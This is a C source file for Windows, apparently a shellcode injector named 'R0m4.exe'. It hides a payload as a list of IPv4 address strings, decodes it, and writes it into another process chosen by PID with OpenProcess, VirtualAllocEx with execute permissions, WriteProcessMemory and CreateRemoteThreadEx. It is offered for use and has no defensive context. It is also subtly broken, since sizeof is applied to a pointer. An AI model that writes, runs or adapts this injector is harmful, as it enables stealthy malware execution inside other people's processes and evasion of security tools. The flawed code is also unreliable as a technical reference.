#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Some macros to help in the process of writing and printing texts 
#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
// Function to convert an IPv4 address string to shellcode
void ipv4_to_shellcode(const char* ip_addresses[], size_t count, uint8_t* shellcode) {
    for (size_t i = 0; i < count; i++) {
        uint8_t byte1, byte2, byte3, byte4;
        // Parse the IP address string into four bytes
        sscanf_s(ip_addresses[i], "%hhu.%hhu.%hhu.%hhu", &byte1, &byte2, &byte3, &byte4);

        // Store the bytes in the shellcode buffer
        shellcode[i * 4] = byte1;
        shellcode[i * 4 + 1] = byte2;
        shellcode[i * 4 + 2] = byte3;
        shellcode[i * 4 + 3] = byte4;
    }
}
int main(int argc, char* argv[]) {

    const char* ip_addresses[] = {
        "86.227.47.73", "94.71.124.177", "178.179.245.228", "247.231.234.232",
        "236.243.141.111", "219.247.75.147", "162.139.79.151", "222.143.67.155",
        "234.134.253.4", "134.192.103.155", "152.155.95.167", "134.159.233.25",
        "118.231.189.161", "220.243.192.160", "35.42.233.164", "231.38.10.4",
        "184.170.189.165", "101.189.208.122", "176.207.188.244", "38.145.121.129",
        "226.240.254.242", "123.141.0.1", "2.136.132.141", "6.7.8.65",
        "143.203.120.106", "70.14.192.65", "153.91.12.81", "157.87.56.80",
        "27.203.255.75", "83.46.233.105", "221.234.101.174", "18.175.96.40",
        "252.99.29.237", "111.238.249.60", "158.114.53.244", "14.215.77.200",
        "118.56.112.25", "54.122.121.144", "55.155.28.1", "205.7.108.0",
        "75.155.42.12", "197.67.24.21", "217.19.72.28", "87.135.25.210",
        "94.211.20.92", "142.30.56.32", "58.61.61.63", "39.63.41.48",
        "43.49.36.238", "130.79.49.35", "141.147.44.52", "47.45.48.242",
        "104.146.55.130", "129.128.221.200", "60.244.247.183", "217.180.186.137",
        "138.202.218.196", "7.105.216.16", "126.51.149.149", "150.222.17.124",
        "211.39.158.157", "143.195.12.187", "21.225.229.241", "239.46.76.229",
        "35.90.237.23", "226.216.150.182", "77.102.248.60", "92.223.185.184",
        "186.187.229.252", "4.150.64.170", "194.60.17.175", "204.134.150.153",
        "154.134.253.4", "131.254.16.153", "45.19.156.92", "20.159.39.25",
        "146.82.29.156", "100.53.239.62", "2.28.49.173", "111.32.130.249",
        "171.179.160.100", "12.167.121.8", "179.73.109.80", "130.150.7.44",
        "127.59.136.247", "183.0.206.116", "231.235.151.5", "6.7.64.138",
        "230.27.68.132", "236.66.33.216", "120.23.85.77", "94.158.225.88",
        "160.25.197.213", "65.224.245.162", "218.35.90.112", "110.164.236.9",
        "116.162.218.71", "110.110.105.89", "50.35.52.53", "119.111.112.176",
        "200.115.13.244", "127.133.24.229", "17.166.187.144", "14.206.139.0",
        "195.140.1.124", "135.6.217.161", "26.218.142.29", "223.174.25.227",
        "88.130.148.2", "161.138.227.153", "98.30.76.61", "39.48.49.1",
        "106.43.108.109", "47.55.26.113", "40.50.206.126", "89.120.72.134",
        "175.44.37.60", "196.10.238.204", "227.124.81.204", "121.73.97.181",
        "117.116.115.197", "143.76.216.184", "84.219.17.99", "227.35.217.102",
        "125.195.246.157", "199.36.64.188", "136.169.229.44", "124.88.125.169",
        "69.0.0.0"
    };

    size_t count = sizeof(ip_addresses) / sizeof(ip_addresses[0]);
    uint8_t* shellcode = (uint8_t*)malloc(count * 4);

    if (shellcode == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 1;
    }

    // Convert IP addresses to shellcode

    if (argc < 2) {
        warning("you should enter the process ID to inject the SHELLCODE in !! \n USAGE : R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    info("Now we are trying to open the process with the ID : %ld \n", PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

    if (hProcess != NULL) {
        okay("We got handle on the process----------0x%p", hProcess);

        //Allocate some bytes to the process memory

        rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions inside %ld", sizeof(shellcode), PID);

        //Writing inside the allocated process
        ipv4_to_shellcode(ip_addresses, count, shellcode);
        printf("Shellcode:\n");
        for (size_t i = 0; i < count * 4; i++) {
            printf("\\x%02x", shellcode[i]);
        }
        WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
        info("Wrote %zu-bytes to process memory\n", sizeof(shellcode));

        //Thread to run payload
        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

        if (hThread == NULL) {

            warning("The PID %ld doesn't exist you should try other stuff \n Error %ld  ", PID, GetLastError());
            CloseHandle(hProcess);
            return EXIT_FAILURE;
        }
        okay("We got handle on the Thread %ld ----------0x%p", TID, hThread);


        okay("Cleaning up everything !!");
        info("waiting for thread to finish -_- \n");
        WaitForSingleObject(hThread, INFINITE);
        info("thread finished executing :) \n");
        CloseHandle(hProcess);
        CloseHandle(hThread);

        info("finished , see you next time mate :) ;)");


        return 0;
    }
    else
    {
        warning("The PID %ld doesn't exist you should try other stuff \n Error %ld  ", PID, GetLastError());
        return EXIT_FAILURE;
    }


}